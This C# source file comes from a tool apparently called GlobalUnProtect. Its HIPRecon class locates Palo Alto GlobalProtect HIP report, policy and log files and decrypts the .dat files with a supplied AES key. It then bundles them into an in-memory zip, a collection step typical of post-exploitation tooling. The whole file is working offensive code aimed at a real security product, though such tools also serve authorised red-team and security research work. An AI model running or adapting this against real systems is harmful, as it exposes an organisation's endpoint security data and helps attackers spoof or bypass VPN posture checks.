using System;
using System.Collections.Generic;
using System.IO;

namespace GlobalUnProtect.Utilities
{
    internal class HIPRecon
    {
        public static void CollectHIPFiles(byte[] aesKey, InMemoryZip inMemoryZip)
        {
            string programFilesPath = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
            string globalProtectPath = Path.Combine(programFilesPath, "Palo Alto Networks", "GlobalProtect");

            List<string> patterns = new List<string>
                {
                    "HIP_*_Report_*.dat",
                    "HipPolicy.dat",
                    "PanGPHip.log"
                };

            Console.WriteLine($"[*] Collecting HIP profile data files");

            List<string> collectedFiles = new List<string>();
            foreach (string pattern in patterns)
            {
                collectedFiles.AddRange(Directory.GetFiles(globalProtectPath, pattern));
            }


            foreach (var file in collectedFiles)
            {
                byte[] fileBytes;

                if (file.EndsWith(".dat", StringComparison.OrdinalIgnoreCase))
                {
                    fileBytes = File.ReadAllBytes(file);
                    fileBytes = GlobalUnProtect.Utilities.Decryption.AESDecrypt(fileBytes, aesKey);
                }
                else
                {
                    fileBytes = File.ReadAllBytes(file);
                }

                inMemoryZip.AddFile(fileBytes, Path.GetFileName(file));
            }
        }
    }
}
